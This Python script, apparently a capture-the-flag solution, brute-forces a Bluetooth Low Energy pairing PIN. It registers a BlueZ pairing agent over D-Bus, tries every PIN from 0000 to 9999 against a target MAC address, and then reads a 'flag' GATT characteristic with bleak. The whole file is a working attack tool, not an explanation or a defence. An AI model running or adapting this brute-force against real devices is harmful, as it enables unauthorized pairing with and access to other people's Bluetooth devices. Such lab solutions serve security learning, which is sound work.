import asyncio
import sys
from dbus_fast.aio.message_bus import MessageBus
from dbus_fast.service import ServiceInterface, method
from dbus_fast import BusType
from dbus_fast.errors import DBusError
from bleak import BleakClient

FLAG_CHAR_UUID = "b1eb1eb1-0001-1000-8000-00805f9b34fb"
AGENT_PATH = "/org/test/agent"
MAC = input("Enter target MAC address: ").strip()
DEBUG = "--debug" in sys.argv
DEVICE_PATH = f"/org/bluez/hci0/dev_{MAC.replace(':', '_')}"


class PairingAgent(ServiceInterface):
    def __init__(self):
        super().__init__("org.bluez.Agent1")
        self.pin = 0

    @method()
    def Release(self): pass

    @method()
    def Cancel(self):
        if DEBUG: print(f"[DBG] Cancelled")

    @method()
    def RequestPasskey(self, device: "o") -> "u":
        if DEBUG: print(f"[DBG] RequestPasskey -> {self.pin:04d}")
        return self.pin


async def main():
    bus = await MessageBus(bus_type=BusType.SYSTEM).connect()

    agent = PairingAgent()
    bus.export(AGENT_PATH, agent)

    bluez = bus.get_proxy_object("org.bluez", "/org/bluez",
                                 await bus.introspect("org.bluez", "/org/bluez"))
    agent_mgr = bluez.get_interface("org.bluez.AgentManager1")
    await agent_mgr.call_register_agent(AGENT_PATH, "KeyboardOnly")
    await agent_mgr.call_request_default_agent(AGENT_PATH)

    adapter = bus.get_proxy_object("org.bluez", "/org/bluez/hci0",
                                   await bus.introspect("org.bluez", "/org/bluez/hci0")
                                   ).get_interface("org.bluez.Adapter1")

    print(f"[*] Brute-forcing PIN on {MAC} (0000-9999)...")
    for pin in range(10000):
        print(f"\r[*] Trying PIN: {pin:04d}", end="", flush=True)
        agent.pin = pin
        try:
            device = bus.get_proxy_object("org.bluez", DEVICE_PATH,
                                          await bus.introspect("org.bluez", DEVICE_PATH)
                                          ).get_interface("org.bluez.Device1")
            await device.call_pair()
            print(f"\n[+] SUCCESS! PIN = {pin:04d}")
            break
        except DBusError as e:
            if DEBUG: print(f"\n[DBG] {pin:04d} failed: {e.text}")
            try: await adapter.call_remove_device(DEVICE_PATH)
            except Exception: pass
    else:
        print("\n[-] PIN not found.")
        return

    print("[*] Reading flag characteristic...")
    async with BleakClient(MAC) as client:
        value = await client.read_gatt_char(FLAG_CHAR_UUID)
        print(f"[!!!] FLAG: {value.decode()}")


asyncio.run(main())
